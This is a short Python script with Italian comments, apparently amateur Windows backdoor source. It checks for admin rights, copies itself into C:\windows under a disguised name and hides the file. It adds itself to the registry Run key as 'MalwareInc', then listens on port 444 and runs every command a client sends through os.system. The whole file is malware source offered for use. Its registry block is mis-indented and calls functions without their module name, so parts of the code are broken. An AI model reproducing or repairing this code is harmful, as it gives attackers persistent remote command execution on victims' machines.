#!/usr/bin/python
#brat volk
#-------------------------------------------------------------------------------------------------------------
#importiamo le librerie per interfacciarci con il sistema(os) , modificare il registro di sistema(winreg) , controllare i privilegi dello script(ctypes) , copiare il server(shutil) e creare un socket(socket)
import os
import socket
import ctypes
from shutil import copy
from sys import argv, executable
import _winreg as winreg


class main:
        
        #definiamo un port su cui verra` creato il socket
        PORT = 444
        
        #definiamo la directory e il nome del server
        dir_path = os.path.dirname(os.path.realpath(__file__))
        file__name = os.path.basename(__file__)
        
        #controlliamo il livello dello script (user/admin)
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if is_admin != 1 :
                print("need admin privileges!")
                os.system("pause")
                raise SystemExit()
                
        #copiamo il server nella directory di sistema
        copy(dir_path, "C:\\windows\\hdllmw1.exe")
        
        #nascondiamo il server
        os.system("attrib +h C:\\windows\\hdllmw1.exe")
        
        #aggiungiamo server.exe allo startup nel regedit
                   aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
           aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
           aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
           SetValueEx(aKey,"MalwareInc",0, REG_SZ, r"C:\\Windows\\hdllmw1.exe")
           CloseKey(aKey)
           CloseKey(aReg)
        
        #definiamo un socket in ascolto su un port hardcoded
        socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket1.bind((socket.gethostname(), PORT))
        socket1.listen(5)
        conn, addr = socket1.accept()
        
        #creiamo un loop che riceve i dati
        while 1:
             data = conn.recv(893892)
             os.system(data)
             if data == "done":
                 break
